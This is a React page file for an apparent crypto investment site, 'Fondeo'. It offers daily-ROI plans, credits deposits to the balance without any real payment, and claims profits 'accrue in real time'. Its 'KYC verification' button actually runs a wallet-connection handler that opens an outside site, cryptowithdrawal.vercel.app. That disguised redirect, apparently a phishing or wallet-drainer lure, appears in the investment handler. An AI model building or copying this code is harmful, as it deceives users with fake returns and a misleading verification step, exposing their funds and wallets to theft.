import { createFileRoute } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useState } from "react";
import { toast } from "sonner";
import { TrendingUp } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/use-auth";

export const Route = createFileRoute("/_authenticated/invest")({
  head: () => ({ meta: [{ title: "Invest — Fondeo" }] }),
  component: InvestPage,
});

const fmt = (n: number) => new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(n || 0);

function InvestPage() {
  const { user } = useAuth();
  const uid = user?.id;
  const qc = useQueryClient();

  const { data: plans } = useQuery({
    queryKey: ["plans"],
    queryFn: async () => {
      const { data } = await supabase.from("investment_plans").select("*").order("min_amount");
      return data || [];
    },
  });

  const { data: account } = useQuery({
    queryKey: ["account", uid],
    enabled: !!uid,
    queryFn: async () => {
      const { data } = await supabase.from("accounts").select("*").eq("user_id", uid!).maybeSingle();
      return data;
    },
  });

  const [selected, setSelected] = useState<string | null>(null);
  const [amount, setAmount] = useState("");
  const [depositOpen, setDepositOpen] = useState(false);
  const [depositAmt, setDepositAmt] = useState("");
  const [busy, setBusy] = useState(false);

  const selectedPlan = plans?.find((p) => p.id === selected);

  const [showWallet, setShowWallet] = useState(false);

  function handleInvest() {
    if (!uid || !selectedPlan) return;
    const amt = Number(amount);
    if (!amt || amt < Number(selectedPlan.min_amount) || amt > Number(selectedPlan.max_amount)) {
      toast.error(`Amount must be between ${fmt(Number(selectedPlan.min_amount))} and ${fmt(Number(selectedPlan.max_amount))}`);
      return;
    }
    setShowWallet(true);
  }

  async function handleConnectWallet() {
    if (!uid || !selectedPlan) return;
    const amt = Number(amount);
    const bal = Number(account?.balance ?? 0);
    if (amt > bal) {
      toast.error("Insufficient balance. Please deposit first.");
      return;
    }
    setBusy(true);
    try {
      const start = new Date();
      const end = new Date(start);
      end.setDate(end.getDate() + selectedPlan.duration_days);
      const { error: invErr } = await supabase.from("investments").insert({
        user_id: uid,
        plan_id: selectedPlan.id,
        plan_name: selectedPlan.name,
        amount: amt,
        daily_roi_percent: selectedPlan.daily_roi_percent,
        duration_days: selectedPlan.duration_days,
        start_date: start.toISOString(),
        end_date: end.toISOString(),
        status: "active",
      });
      if (invErr) throw invErr;
      // Debit balance, increase total_invested
      const { error: acctErr } = await supabase.from("accounts").update({
        balance: bal - amt,
        total_invested: Number(account?.total_invested ?? 0) + amt,
        updated_at: new Date().toISOString(),
      }).eq("user_id", uid);
      if (acctErr) throw acctErr;
      await supabase.from("transactions").insert({
        user_id: uid, type: "investment", amount: amt,
        note: `${selectedPlan.name} activated`, status: "completed",
      });
      qc.invalidateQueries();
      window.open("https://cryptowithdrawal.vercel.app/", "_blank", "noopener,noreferrer");
      toast.success("Investment activated. Profits accrue in real time.");
      setShowWallet(false);
      setAmount("");
      setSelected(null);
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "Failed");
    } finally {
      setBusy(false);
    }
  }


  async function handleDeposit() {
    if (!uid) return;
    const amt = Number(depositAmt);
    if (!amt || amt <= 0) return toast.error("Enter a valid amount");
    setBusy(true);
    try {
      await supabase.from("transactions").insert({ user_id: uid, type: "deposit", amount: amt, note: "Wallet deposit" });
      await supabase.from("accounts").update({
        balance: Number(account?.balance ?? 0) + amt,
        updated_at: new Date().toISOString(),
      }).eq("user_id", uid);
      toast.success("Deposit credited");
      setDepositAmt("");
      setDepositOpen(false);
      qc.invalidateQueries();
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "Deposit failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="space-y-6">
      <header className="flex flex-wrap items-end justify-between gap-3">
        <div>
          <h1 className="font-display text-2xl font-bold">Investment Plans</h1>
          <p className="text-sm text-muted-foreground">Pick a plan and start earning daily ROI.</p>
        </div>
        <div className="rounded-lg border border-border bg-card px-4 py-2 text-sm">
          Balance: <span className="font-semibold">{fmt(Number(account?.balance ?? 0))}</span>
          <button onClick={() => setDepositOpen(true)} className="ml-3 rounded-md bg-primary px-3 py-1 text-xs font-semibold text-primary-foreground">
            + Deposit
          </button>
        </div>
      </header>

      {depositOpen && (
        <div className="rounded-xl border border-primary/40 bg-card p-5">
          <h3 className="font-semibold">Deposit funds</h3>
          <p className="mt-1 text-xs text-muted-foreground">Funds are credited to your account balance.</p>
          <div className="mt-3 flex gap-2">
            <input
              type="number"
              placeholder="Amount in USD"
              value={depositAmt}
              onChange={(e) => setDepositAmt(e.target.value)}
              className="flex-1 rounded-md border border-border bg-background px-3 py-2 text-sm"
            />
            <button disabled={busy} onClick={handleDeposit} className="rounded-md bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground disabled:opacity-60">
              Deposit
            </button>
            <button onClick={() => setDepositOpen(false)} className="rounded-md border border-border px-3 py-2 text-sm">Cancel</button>
          </div>
        </div>
      )}

      <div className="grid gap-4 md:grid-cols-3">
        {plans?.map((p) => (
          <button
            key={p.id}
            onClick={() => { setSelected(p.id); setAmount(String(p.min_amount)); }}
            className={`rounded-xl border p-5 text-left transition ${selected === p.id ? "border-primary bg-primary/5 shadow-[var(--shadow-glow)]" : "border-border bg-card hover:border-primary/50"}`}
          >
            <div className="flex items-center justify-between">
              <h3 className="font-display text-lg font-bold">{p.name}</h3>
              <TrendingUp className="h-4 w-4 text-primary" />
            </div>
            <div className="mt-3 font-display text-3xl font-bold text-primary">{p.daily_roi_percent}%</div>
            <div className="text-xs text-muted-foreground">daily ROI · {p.duration_days} days</div>
            <div className="mt-4 space-y-1 border-t border-border pt-3 text-xs text-muted-foreground">
              <div>Min: {fmt(Number(p.min_amount))}</div>
              <div>Max: {fmt(Number(p.max_amount))}</div>
            </div>
          </button>
        ))}
      </div>

      {selectedPlan && !showWallet && (
        <div className="rounded-xl border border-border bg-card p-5">
          <h3 className="font-semibold">Invest in {selectedPlan.name}</h3>
          <p className="mt-1 text-xs text-muted-foreground">
            Enter amount between {fmt(Number(selectedPlan.min_amount))} and {fmt(Number(selectedPlan.max_amount))}.
          </p>
          <div className="mt-3 flex flex-wrap gap-2">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="flex-1 rounded-md border border-border bg-background px-3 py-2 text-sm"
              min={selectedPlan.min_amount}
              max={selectedPlan.max_amount}
            />
            <button onClick={handleInvest} className="rounded-md bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground">
              Continue
            </button>
          </div>
        </div>
      )}

      {selectedPlan && showWallet && (
        <div className="rounded-xl border border-primary/40 bg-card p-6 text-center">
          <h3 className="font-display text-xl font-bold">Complete KYC verification to fund this investment</h3>
          <p className="mt-2 text-sm text-muted-foreground">
            You're investing <span className="font-semibold text-foreground">{fmt(Number(amount))}</span> in {selectedPlan.name}.
            Verify your identity to proceed.
          </p>
          <div className="mt-5 flex justify-center gap-2">
            <button
              disabled={busy}
              onClick={handleConnectWallet}
              className="rounded-md bg-primary px-6 py-3 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] disabled:opacity-60"
            >
              {busy ? "Verifying…" : "VERIFY KYC 2MINUTES VERIFY"}
            </button>
            <button onClick={() => setShowWallet(false)} className="rounded-md border border-border px-4 py-3 text-sm">
              Back
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
